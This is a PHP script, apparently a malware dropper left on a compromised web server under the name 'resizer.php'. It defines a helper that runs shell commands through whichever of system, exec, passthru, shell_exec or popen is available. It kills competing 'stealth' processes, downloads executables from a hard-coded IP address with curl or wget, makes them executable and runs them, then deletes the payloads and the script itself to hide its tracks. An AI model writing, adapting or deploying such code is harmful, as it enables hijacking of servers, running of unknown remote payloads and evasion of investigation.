<?php
function get($durl, $filename) {
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $durl);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch,CURLOPT_TIMEOUT,20);
	$data = curl_exec($ch);
	if(!$data){
		$data = @file_get_contents($durl);
	}
	file_put_contents('./'.$filename, $data);
}
function made($mcon){
	$result = '';
	if(function_exists('system')){
		ob_start();
		@system($mcon);
		$result = ob_get_clean();
	}elseif(function_exists('exec')){
		@exec($mcon,$result);
		$result = @join("\n",$result);
	}elseif (function_exists('passthru')){
		ob_start();
		@passthru($mcon);
		$result = ob_get_clean();
	}elseif(function_exists('shell_exec')){
		$result = shell_exec($mcon);
	}elseif(is_resource($f = @popen($mcon,"r"))){
		$result = "";
		while(!@feof($f))
			$result .= fread($f,1024);
		pclose($f);
	}
	$type = mb_detect_encoding($result, array("ASCII",'UTF-8',"GB2312","GBK",'BIG5','LATIN1'));
	if($type != 'UTF-8'){
		$result = mb_convert_encoding($result, 'UTF-8', $type);
	}
	return $result;
}
function download($url,$file){
	$a = "curl -o ./".$file." ".$url;
	$b = "curl ".$url." > ./".$file;
	$c = "wget -O ./".$file." ".$url;
	if(function_exists('curl_init')){
		get($url,$file);
		if(!file_exists($file)){
			made($a);
			if(!file_exists($file)){
				made(b);
			}elseif(!file_exists($file)){
				made(c);
			}
		}
	}else{
		made($a);
		if(!file_exists($file)){
			made(b);
		}elseif(!file_exists($file)){
			made(c);
		}
	}
	
}
made("pkill -9 -f stealth");
made("pkill -f -9 stealth");
$e4 = "http://142.4.209.101/brochure4bak";
$e2 = "http://142.4.209.101/accordion2";
download($e4,"brochure4bak");
$result = made("chmod +x brochure4bak && ./brochure4bak");
if(strstr($result,"4.71")){
	echo $result;
}else{
	download($e2,"accordion2");
	$result2 = made("chmod +x accordion2 && ./accordion2");
	echo $result2;
}

unlink("./brochure4bak");
unlink("./accordion2");
unlink("./resizer.php");
